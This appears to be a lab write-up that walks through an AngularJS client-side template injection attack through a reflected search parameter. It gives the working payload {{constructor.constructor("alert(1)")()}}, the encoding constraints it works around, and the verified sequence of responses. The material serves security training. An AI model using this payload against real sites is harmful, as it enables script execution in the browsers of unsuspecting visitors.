# Attack Chain — AngularJS expression injection via reflected search term

## Data flow
```
Victim URL   /?search={{constructor.constructor("alert(1)")()}}
   │  (transport: %7B%7B…%22…%22…%7D%7D)
   ▼
[INPUT] server reflects term into <h1>0 search results for 'TERM'</h1>
   │  encoding: {{}} " raw ; '→&apos; ; <→&lt; ; >→&gt;
   ▼
[SINK] AngularJS bootstrap (<body ng-app>): $compile walks the DOM, finds {{…}},
$parse compiles the EXPRESSION against scope
   │  expression: constructor.constructor("alert(1)")()
   │    constructor        → Object (via scope prototype chain — no globals needed)
   │    .constructor       → Function (Object's constructor)
   │    ("alert(1)")       → new global function with body alert(1)
   │    ()                 → executes with FULL window/global access
   ▼
[TRUST BOUNDARY CROSSED] template-text(data) → compiled expression → global
function(code) in page origin, victim context
   ▼
RESULT: alert(1) on crafted-URL load, no interaction, no markup involved
```

## Why this shape (constraint-satisfying, not styled)
- `{{…}}` delimiters mandatory — they are what the compiler looks for (proven:
  `{{7*7}}` → `49`).
- NO angle brackets usable (`&lt;&gt;`) — irrelevant anyway: expressions aren't markup.
- NO single quotes (`&apos;`) — string literals MUST use `"` (verified raw).
- NO window globals in the expression itself (`String`, `document`, `alert` are NOT
  in scope) — hence the constructor chain: reach `Function` through the scope chain
  (`constructor`), then smuggle globals INSIDE the generated function's body string,
  which runs with full global access. Two privilege levels, one payload.
- NO sandbox escape needed — Angular 1.6+ removed the sandbox (1.7.7 here). On
  1.0–1.5 the same chain would need sandbox-bypass gadgets instead.

## Expected response sequence (verified)
1. `GET /?search=<encoded expression>` → 200, expression text in `<h1>`.
2. Browser bootstraps Angular; compiler evaluates the expression during DOM walk.
3. Generated global function runs `alert(1)` → `is-solved` (first poll).